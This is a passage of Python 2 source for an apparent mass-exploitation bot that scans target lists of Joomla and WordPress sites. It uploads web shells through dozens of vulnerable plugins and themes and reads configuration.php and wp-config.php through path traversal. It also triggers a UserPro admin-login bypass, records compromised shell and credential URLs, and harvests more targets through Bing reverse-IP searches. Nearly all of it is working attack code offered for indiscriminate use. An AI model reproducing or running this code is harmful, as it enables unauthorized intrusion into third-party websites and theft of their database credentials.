                vuln = (i+'/index.php?option=com_foxcontact&view=foxcontact&Itemid=')
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
                r = requests.get(vuln,headers=user)
                html = r.content
                soup = BeautifulSoup(html,'html.parser')
                for op in soup.findAll('a'):
                    a= op.get('href')
                    if str('com_foxcontact') in a:
                        if '1' in a or '2' in a or '3' in a or '4' in a or '5' in a or '6' in a or '7' in a or '8' in a or '9' in a:
                            print bb,('{}{}'+i).format(fb,sb)
                            print bb,('{}Cid is: '.format(fg,sd)),a[+56]+a[+57]+a[+58]
                            e = a[+56]+a[+57]+a[+58]
                            with open('Resultat/Foxcontact_cid.txt','a') as cid:
                                cid.writelines(i+' :  '+e+'\n')
                            break
                        else:
                            pass
                    else:
                        pass
            else:
                failed(foxcontact,i)
            check_fox = requests.get(i+'/index.php?option=com_foxcontact&amp;view=invalid')
            if 'com_foxcontact' in check_fox.content:
                cids = re.findall('foxcontact&amp;Itemid=(.*?)" >',check_fox.content)
                for cid in cids:
                    cid = str(cid)
                    blackb0x = ["/components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filenames), "/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, cid, filenames), "/index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../{}".format(cid, cid, cid, cid, filenames), "/components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../{}".format(cid, cid, filenames)]
                    ids = 0
                    for b0x in blackb0x:
                        ids += 1
                        vuln_urls = i + b0x
                        req_fox = requests.post(vuln_urls, data=shell)
                        check_shells = requests.get(i+'/components/com_foxcontact/'+filenames)
                        if 'ATTARI' in check_shells.content:
                            success("FoxContact2...................")
                            with open('Resultat/Sh3llZ.txt','a') as fo:
                                fo.writeines(i+'/components/com_foxcontact/'+filenames)
                        else:
                            failed("FoxContact2...................",i)
            else:
                failed("FoxContact2...................",i)
            i = i.rstrip()
            shell ="files/bb.jpg"
            com_jbcatalog = {'files[]':open(shell, 'rb')}
            req_jbcatalog = requests.post(i+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=com_jbcatalog)
            Sh = requests.get(i+'/com_jbcatalog/libraries/jsupload/server/php/files/'+shell)
            if "ATTARI" in Sh.content:
                success("Jbcatalog.....................")
                with open('Resultat/Sh3llz.txt','a') as jb:
                    jb.writelines(i+'/com_jbcatalog/libraries/jsupload/server/php/files/'+shell+'\n')
            else:
                failed("Jbcatalog.....................",i)
                
            #adsmanager Shell
            shell = 'files/index.jpg'
            files = {'file': open(shell, 'rb')}
            data = {"name": "attari.php"}
            url = i+'/index.php?option=com_adsmanager&task=upload&tmpl=component'
            r = requests.post(url, files=files,headers=user, data=data)
            
            if '"jsonrpc"' in r.text.encode('utf-8'):
                requests.post(url, files=files, data={"name": "attari.phP"})
                requests.post(url, files=files, data={"name": "attari.phtml"})
                Check = requests.get(i+ '/tmp/plupload/attari.php',headers=user)
                Check2 = requests.get(i+ '/tmp/plupload/attari.phP',headers=user)
                Check3 = requests.get(i+ '/tmp/plupload/attari.phtml',headers=user)
                
                if 'ATTARI' in Check.text.encode('utf-8'):
                    success(adsmanager)
                    with open('Resultat/Sh3llz.txt','a') as ad:
                        ad.writelines(i+ '/tmp/plupload/attari.php'+'\n')
                elif 'ATTARI' in Check2.text.encode('utf-8'):
                    success(adsmanager)
                    with open('Resultat/Sh3llz.txt','a') as ad:
                        ad.writelines(i+ '/tmp/plupload/attari.phP'+'\n')
                elif 'ATTARI' in Check3.text.encode('utf-8'):
                    success(adsmanager)
                    with open('Resultat/Sh3llz.txt','a') as ad:
                        ad.writelines(i+ '/tmp/plupload/attari.phtml'+'\n')
                else:
                    failed(adsmanager,i)
            else:
                failed(adsmanager,i)
            direct = 'files/atx.php3.g'
            ar = 'files/atx.zip'
            files = {'file_upload': (ar, open(ar, 'rb'), 'multipart/form-data'),
                     'pic_upload': (direct, open(direct, 'rb'), 'multipart/form-data')}
            data = {
                'name': 'ur name',
                'mail': 'TTTntsfT@aa.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
                'option': "com_jdownloads",
                'view': "upload"
                }
            vuln = i+'/index.php?option=com_jdownloads&Itemid=0&view=upload'
            r = requests.post(vuln, files=files ,headers=user,data=data)
            
            ok = str(r)
            if '/upload_ok.png' in r.text.encode('utf-8'):
                url = i +'/images/jdownloads/screenshots/atx.php3.g'
                check = requests.get(url,headers=user)
                
                if 'ATTARI' in check.text:
                    success(jdownloads)
                    with open('Resultat/Sh3llZ.txt','a') as do:
                        do.writelines(url+'\n')
                else:
                    failed(jdownloads,i)
            else:
                failed(jdownloads,i)
            #i = i.rstrip()
            fucked =i+ '/components/com_sexycontactform/fileupload/files/up.php'
            link = i+'/components/com_sexycontactform/fileupload/index.php'
            fil = open('files/up.php','rb')
            files = {"file":fil}
            r = requests.post(link,files=files)
            uk = requests.get(fucked,headers=headers)
            if 'ATTARI' in uk.content:
                success(sex)
                with open('Resultat/Sh3llz.txt','a') as se:
                    se.writelines(fucked+'\n')
            else:
                failed(sex,i)
            ####simplefileupload

#"Sydney........................"
#"download-monitor.............."
                
            ######
            
            url = i+'/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0'
            r = requests.get(url)
            if "$host" in r.content:
                success("community.....................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("community.....................",i)


                
            url = i+'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("wddownload....................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("wddownload....................",i)




                
            url = i+'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1'
            r = requests.get(url)
            if "$host" in r.content:
                success("product_modul.................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("product_modul.................",i)



                
            url = i+'/index.php?option=com_jetext&task=download&file=../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("jetext........................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("jetext........................",i)






                
            url = i+'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("contushdvideoshare............")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("contushdvideoshare............",i)







            url = i+'/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("addproperty...................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("addproperty...................",i)





                
            url = i+'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA=='
            r = requests.get(url)
            if "$host" in r.content:
                success("mod_dvfoldercontent...........")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("mod_dvfoldercontent...........",i)


            url = i+'/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("s5_media_player...............")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("s5_media_player...............",i) 



                
            url = i+'/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("facegallery...................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("facegallery...................",i)

                
            url = i+'/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("macgallery....................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("macgallery....................",i)


                
            url = i+'/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php'
            r = requests.get(url)
            if "$host" in r.content:
                success("jtagmembersdirectory..........")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("jtagmembersdirectory..........",i)
                
            url = i+'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'
            r = requests.get(url)
            if "$host" in r.content:
                success("aceftp........................")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("aceftp........................",i)

                
            url = i+joom
            r = requests.get(url)
            if "$host" in r.content:
                success("joomanager config.............")
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("joomanager config.............",i)
            url = i+hdf
            r = requests.get(url)
            if "$host" in r.content:
                success(hd)
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed(hd,i)
            #
            
            #
            url = i+al
            r = requests.get(url)
            if "$host" in r.content:
                success(jw)
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed(jw,i)
            url = i+"/index.php?option=com_cckjseblod&task=download&file=configuration.php"
            r = requests.get(url)
            if "$host" in r.content:
                success(cs)
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed(cs,i)

            url = i+"/index.php?option=com_user&view=reset&layout=confirm"
            r = requests.get(url)
            if "$host" in r.content:
                success("com_user......................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_user......................",i)

            url = i+"/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B"
            r = requests.get(url)
            if "$host" in r.content:
                success("com_search....................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_search....................",i)


            url = i+"/index.php?option=com_content&view=archive"
            r = requests.get(url)
            if "$host" in r.content:
                success("archive.......................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("archive.......................",i)

            url = i+"/index.php?option=com_mailto&view=archive"
            r = requests.get(url)
            if "$host" in r.content:
                success("com_mailto....................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_mailto....................",i)

            url = i+"/index.php?option=com_users&view=archive"
            r = requests.get(url)
            if "$host" in r.content:
                success("com_users.....................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_users.....................",i)

            url = i+"/index.php?option=com_installer&view=archive"
            r = requests.get(url)
            if "$host" in r.content:
                success("com_installer.................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_installer.................",i)

            url = i+"/admin.advancedpoll.php?mosConfig_live_site="
            r = requests.get(url)
            if "$host" in r.content:
                success("advancedpoll..................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("advancedpoll..................",i)

            url = i+"/admin.Akocomment.php?mosConfig_live_site="
            r = requests.get(url)
            if "$host" in r.content:
                success("Akocomment....................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("Akocomment....................",i)


            url = i+"/lang.php?mosConfig_absolute_path="
            r = requests.get(url)
            if "$host" in r.content:
                success("com_trad......................")
                #       "Revslider Config.............."
                with open('Resultat/joomla_config.txt','a') as bb:
                    bb.writelines(url+'\n')
            else:
                failed("com_trad......................",i)




                
        elif 'wordpress' in rb.content or 'WordPress' in rb.content:
        #elif 1 == 1:
            #print('')
            with open('Sites/WordPress.txt','a') as wp:
                wp.writelines(i+'\n')
            #wp2
            nve.jsr(i)
            nve.sydney(i)
            nve.wpmbl(i)

            #revslider
            data = {'action':'revslider_ajax_action',
                    'client_action':'update_plugin'}
            filename = open('files/attari.zip','rb')
            files = {'update_file':filename}
            r = requests.post(i+'/wp-admin/admin-ajax.php',headers=user, data=data , files=files)
            ch = requests.get(i+'/wp-content/plugins/revslider/temp/update_extract/attari.php',headers=user)
            
            if 'ATTARI' in ch.content:
                success(revslider)
                with open('Resultat/Sh3llz.txt','a') as rev:
                    rev.writelines(i+'/wp-content/plugins/revslider/temp/update_extract/attari.php'+'\n')
            else:
                failed(revslider,i)
            #mass exploits
            download(i)
            work(i)
            cr(i)
            dzs(i)
            In(i)
            sli(i)
            sim(i)
            power(i)
            pro(i)
            blaze(i)
            #gravity
            filename = open('files/bb.jpg','rb')
            data  = {'field_id':'3',
                     'form_id':'1',
                     'gform_unique_id':'../../../../',
                     'name':'attari.phtml'}
            files = {'file':filename}
            r = requests.post(i+'/?gf_page=upload',headers=user, data=data, files=files)
            check= requests.get(i+'/wp-content/_input_3_attari.phtml',headers=user)
    
            if 'ATTARI' in check.text:
                success(gravity)
                with open('Resultat/Sh3llz.txt','a') as gra:
                    gra.writelines(i+'/wp-content/_input_3_attari.phtml'+'\n')
            else:
                failed(gravity,i)
            
            #Showbiz
            
            #wysija
            files = {'my-theme':open('files/attari.zip', 'rb')}
            data = {'action':'themeupload',
                    'submitter':'Upload',
                    'overwriteexistingtheme':'on',
                    'page':'GZNeFLoZAb'}
            r = requests.post(i+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' ,headers=user, data=data, files=files)
            ch = requests.get(i+'/wp-content/uploads/wysija/themes/attari/attari.php',headers=user)
            
	    if 'ATTARI' in ch.content:
                success(wysija)
                with open('Resultat/Sh3llz.txt','a') as wy:
                    wy.writelines(i+'/wp-content/uploads/wysija/themes/attari/attari.php'+'\n')
            else:
                failed(wysija,i)
            #cherry
            filename = 'files/up.php'
            files = {'file': filename}
            r = requests.post(i+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php',headers=user, files=files)
            ch = requests.get(i+'/wp-content/plugins/cherry-plugin/admin/import-export/up.php',headers=user)
            if 'ATTARI' in ch.content:
                success(cherry)
                with open('Resultat/Sh3llz.txt','a') as che:
                    che.writelines(i+'/wp-content/plugins/cherry-plugin/admin/import-export/up.php'+'\n')
            else:
                failed(cherry,i)
            #formcraft
            filename = open('files/up.php')
            files = {'files[]':filename}
            poc = i+ '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            r = requests.post(poc,files=files,headers=user)
            ck = requests.get(i+'/wp-content/up.php')
            if "ATTARI" in ck.content:
                success("Formcraft.....................")
                with open('Resultat/Sh3llz.txt','a') as f:
                    f.writelines(i+'/wp-content/up.php'+'\n')
            else:
                failed('Formcraft.....................',i)
            #pure
            link = i+'/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php'
            shell = i+"/up.php"
            filenam = open('files/up.php')
            files = {"Filedata":filenam}
            r = requests.post(link,files=files)
            get = requests.get(shell)
            if "ATTARI" in get.content:
                success(p)
                with open('Resultat/Sh3llz.txt','a') as f:
                    f.writelines(shell+'\n')
            else:
                failed(p,i)
            #php
            php(i)
            #syn
            syno(i)
            #wpshop
            link = i+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload'
            shell = i+"/wp-content/uploads/up.php"
            filenam = open('files/up.php')
            files = {"wpshop_file":filenam}
            r = requests.post(link,files=files,headers=user)
            get = requests.get(shell,headers=user)
            if 'ATTARI' in get.content:
                success("wpshop........................")
                with open('Resultat/Sh3llz.txt','a') as w:
                    w.writelines(shell+'\n')
            else:
                failed("wpshop........................",i)
            #userpro
            hbi = i+'/?up_auto_log=true'
            mera = requests.get(hbi,headers=user)
            if '<li id="wp-admin-bar-customize" class="hide-if-no-customize">' in mera.content:
                success("Userpro add admin.............")
                with open('Resultat/Admin.txt','a') as w:
                    w.writelines(hbi+'\n')
            else:
                failed("Userpro add admin.............",i)
            #Tevolution
            lok = (i+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php')
            filename = open('files/up.PhP.txt','rb')
            files = {"file":filename}
            r = requests.post(lok,files=files,headers=user)
            done = i+'/wp-content/themes/Directory/images/tmp/up.PhP.txt'
            ee = requests.get(done,headers=user)
            if 'ATTARI' in ee.content:
                success(tev)
                with open('Resultat/Sh3llz.txt','a') as te:
                    te.writelines(done+'\n')
            else:
                failed(tev,i)
            #wp Not installed
            

            #sympo
            link = i + '/wp-content/plugins/wp-symposium/server/php/index.php'
            filename = open('files/up.php','rb')
            files = {"files[]":filename}
            r = requests.post(link,files=files,headers=user)
            done = i+'/wp-content/plugins/wp-symposium/server/php/up.php'
            ee = requests.get(done,headers=user)
            if 'ATTARI' in ee.content:
                success(sym)
                with open('Resultat/Sh3llz.txt','a') as te:
                    te.writelines(done+'\n')
            else:
                failed(sym,i)
            #right now not comp
            nm = "RightNow......................"
            link = i + '/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php'
            filename = open('files/up.php','rb')
            files = {"Filedata":filename}
            r = requests.post(link,files=files,headers=user)
            done = i+'/wp-content/uploads/settingsimages/up.php'
            ee = requests.get(done,headers=user)
            if 'ATTARI' in ee.content:
                success(nm)
                with open('Resultat/Sh3llz.txt','a') as te:
                    te.writelines(done+'\n')
            else:
                failed(nm,i)
            #cracking wordpress
            #let's to Make exploitation config
            #slider = '/wp-config.php'
            slider = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
            #config(slider,revconfig)
            vuln = slider
            conf = i+vuln
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success(revconfig)
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed(revconfig,i)
            #/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php"
            slider = "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php"
            #config(slider,revconfig)
            vuln = slider
            conf = i+vuln
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("acento........................")
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("acento........................",i)

            conf  = i + "/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("ajax-store-locator-wordpress..")
                #       "ajax-store-locator-wordpress.."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("ajax-store-locator-wordpress..",i)

            conf = i + "/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("antioch.......................")
                #       "antioch......................."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("antioch.......................",i)

            conf = i+"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("authentic.....................")
                #       "antioch......................."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("authentic.....................",i)

            conf = i +"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("churchope.....................")
                #       "antioch......................."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("churchope.....................",i)

            conf = i+"/wp-content/themes/felis/download.php?file=../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("felis.........................")
                #       "antioch......................."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("felis.........................",i)

            conf = i+"/wp-content/force-download.php?file=../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("force-download................")
                #       "force-download................"
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("force-download................",i)

            conf = i +"/wp-content/themes/FR0_theme/down.php?path="+i+"/wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("FR0_theme.....................")
                #       "FR0_theme....................."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("FR0_theme.....................",i)

            conf = i+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("hb-audio-gallery-lite.........")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("hb-audio-gallery-lite.........",i)

            conf = i+"/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("history-collection............")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("history-collection............",i)

            conf = i+"/wp-content/plugins/image-export/download.php?file=../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("image-export..................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("image-export..................",i)

            conf = i+"/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("kbslider......................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("kbslider......................",i)

            conf = i+"/wp-content/themes/markant/download.php?file=../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("markant.......................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("markant.......................",i)
            conf = i+"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("MichaelCanthony...............")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("MichaelCanthony...............",i)
            conf = i +"/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("NativeChurch..................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("NativeChurch..................",i)

            conf = i+"/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("parallelus-salutation.........")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("parallelus-salutation.........",i)

            conf = i+"/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("s3bubble-amazon-s3............")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("s3bubble-amazon-s3............",i)
            conf = i+"/themes/SMWF/inc/download.php?file=../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("SMWF..........................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("SMWF..........................",i)
            conf = i+"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("TheLoft.......................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("TheLoft.......................",i)
            conf = i+"/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download"
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success("wp-filemanager................")
                #       "hb-audio-gallery-lite........."
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed("wp-filemanager................",i)
            #config(the,theme)
            vuln = the
            conf = i+vuln
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success(theme)
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed(theme,i)
            #config(ep,epic)
            vuln = ep
            conf = i+vuln
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success(epic)
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed(epic,i)
            #config(asp,aspo)
            vuln = asp
            conf = i+vuln
            r = requests.get(conf)
            ok = r.content
            if 'DB_USER' in ok:
                success(aspo)
                with open('Resultat/Config.txt','a') as te:
                    te.writelines(conf+'\n')
            else:
                failed(aspo,i)
        else:
            print ''
    except:
        print ''
    	#print('{}{}===>You Have Problem in Connection with ').format(fr,sb),i
    
def runattari(i):
    ATTARI(i)
        
def faster():
    ThreadPool = Pool(14)
    Threads = ThreadPool.map(ATTARI, ooo)




class other():
    def cms(self,i):
        if str(os.path.exists('CMS')) == 'False':
            os.system('mkdir CMS')
        else:
            pass
        i = i.rstrip()
        wordpress = i+'/wp-login.php'
        joomla = i+'/administrator'
        drupal = i +'/user/login'
        dr = requests.get(drupal,headers=user)
        rb = requests.get(wordpress,headers=user)
        jo = requests.get(joomla ,headers=user)
        pr = requests.get(i,headers=user)
        pre = 'prestashop' in pr.content or 'Prestashop' in pr.content or 'PrestShop' in pr.content
        joo = 'joomla' in jo.content or 'Joomla' in jo.content or 'joomla' in pr.content
        wor = 'wordpress' in rb.content or 'Wordpress' in rb.content or 'WordPress' in rb.content or 'wordprss' in pr.content
        druu= 'drupal' in dr.content or 'Drupal' in dr.content or 'drupal' in pr.content
        if pre:
        #if True:
            with open('CMS/PrestShop.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}PrestaShop').format(fy,sb)
        elif joo:
        #elif True:
            with open('CMS/Joomla.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}Joomla').format(fg,sb)
        elif joo:
        #elif True:
            with open('CMS/Joomla.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}Joomla').format(fg,sb)
        elif wor:
        #elif True:
            with open('CMS/WordPress.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}WordPress').format(fbl,sb)

        elif druu:
        #elif True:
            with open('CMS/Drupal.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}Drupal').format(fr,sb)



        else:
            with open('CMS/Unknown.txt','a') as sh:
                sh.writelines(i+'\n')
            print bb,('{}{}'+i).format(fb,sb),(']==>'),('{}{}UnkNown').format(fr,sn)

    def correct(self,i):
        try:
            pack.cms(i)
        except:
            print '.'
    def runcms(self):
        try:
            ThreadPool = Pool(15)
            Threads = ThreadPool.map(pack.correct, ooo)
        except:
            pass
            
    def ip(self,i):
        i = i.rstrip()
        i = i.replace("http://", "")
        i = i.replace("https://", "")
        i = i.replace("/", "")
        i = i.replace("\n", "")
        data = socket.gethostbyname(i)
        ok.append(data)

    def runip(self):
        ThreadPool = Pool(15)
        Threads = ThreadPool.map(pack.ip, ooo)



    def grabber(self):
        gr = raw_input('\t        '+bb+('{}{} Give me List Servers: ').format(fr,sb))
        gr = open(gr,'r')
        for done in gr:
            remo = []
            page = 1
            while page < 251:
                bing = "http://www.bing.com/search?q=ip%3A"+done+"+&count=50&first="+str(page)
                opene = requests.get(bing,verify=False,headers=headers)
                read = opene.content
                findwebs = re.findall('<h2><a href="(.*?)"', read)
                for i in findwebs:
                    o = i.split('/')
                    if (o[0]+'//'+o[2]) in remo:
                        pass
                    else:
                        remo.append(o[0]+'//'+o[2])
                        print '{}[XxX]'.format(fg,sb),(o[0]+'//'+o[2])
                        with open('Sites.txt','a') as s:
                            s.writelines((o[0]+'//'+o[2])+'\n')
                page = page+50
        
        



pack = other()

if atx == '5':
    #try:
        #ooo = raw_input('\t        '+bb+('{}{} Give Me List to Run Bot: ').format(fr,sb))
       # ooo = open(ooo,'r')
      #  faster()
    #except:
     #   pass
    ooo = raw_input('\t        '+bb+('{}{} Give Me List to Run Bot: ').format(fr,sb))
    ooo = open(ooo,'r')
    faster()


elif atx =='2':
     ooo = raw_input('\t        '+bb+('{}{} Give Me List To Filter Cms: ').format(fr,sb))
     ooo = open(ooo,'r')
     pack.runcms()

elif atx == '3':
    import socket
